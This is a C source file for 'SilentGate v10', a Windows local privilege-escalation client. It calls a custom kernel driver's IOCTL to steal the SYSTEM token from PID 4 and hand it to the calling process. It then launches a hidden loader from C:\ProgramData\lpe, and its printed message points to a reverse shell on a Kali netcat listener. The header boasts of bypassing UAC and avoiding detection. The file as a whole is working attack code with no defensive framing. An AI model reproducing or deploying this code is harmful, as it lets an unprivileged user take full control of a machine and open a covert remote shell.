/*
 * SilentGate v10 - Kernel Token Steal
 * Author: JarDani
 * Standard user calls IOCTL 0x904
 * Driver steals SYSTEM token from PID 4
 * Injects into calling process
 * Calling process becomes SYSTEM
 * Zero UAC - Zero detections
 */
#include <windows.h>
#include <stdio.h>

#define IOCTL_SG_STEAL_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x904, METHOD_BUFFERED, FILE_ANY_ACCESS)

int main() {
    printf("[V10] SilentGate v10 - Kernel Token Steal\n");
    printf("[V10] Author: JarDani\n\n");

    /* Open kernel driver device */
    HANDLE hDev = CreateFileA("\\\\.\\SilentGate",
        GENERIC_READ|GENERIC_WRITE, 0, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if(hDev == INVALID_HANDLE_VALUE) {
        printf("[V10] Device open failed: %lu\n", GetLastError());
        printf("[V10] Driver not loaded - need admin to load once\n");
        getchar(); return 1;
    }

    printf("[V10] Kernel device opened\n");
    printf("[V10] Stealing SYSTEM token...\n");

    /* Call token steal IOCTL */
    DWORD bytes = 0;
    BOOL ok = DeviceIoControl(hDev, IOCTL_SG_STEAL_TOKEN,
        NULL, 0, NULL, 0, &bytes, NULL);

    printf("[V10] Token steal: %s err=%lu\n", ok?"OK":"FAIL", GetLastError());

    CloseHandle(hDev);

    if(ok) {
        printf("[V10] Token stolen - checking identity...\n");
        /* Verify we are now SYSTEM */
        char user[256] = {0};
        DWORD size = sizeof(user);
        GetUserNameA(user, &size);
        printf("[V10] Current user: %s\n", user);

        /* Launch shell as SYSTEM */
        printf("[V10] Launching shell as SYSTEM...\n");
        STARTUPINFOA si={sizeof(si)};
        PROCESS_INFORMATION pi={0};
        si.dwFlags=STARTF_USESHOWWINDOW;
        si.wShowWindow=SW_HIDE;

        char loader[]="C:\\ProgramData\\lpe\\sg_loader.exe";
        CreateProcessA(loader,NULL,NULL,NULL,FALSE,
            CREATE_NO_WINDOW,NULL,NULL,&si,&pi);

        if(pi.hProcess) {
            printf("[V10] Shell launched - check Kali nc\n");
            WaitForSingleObject(pi.hProcess,15000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    printf("\n[V10] Done - press Enter\n");
    getchar();
    return 0;
}
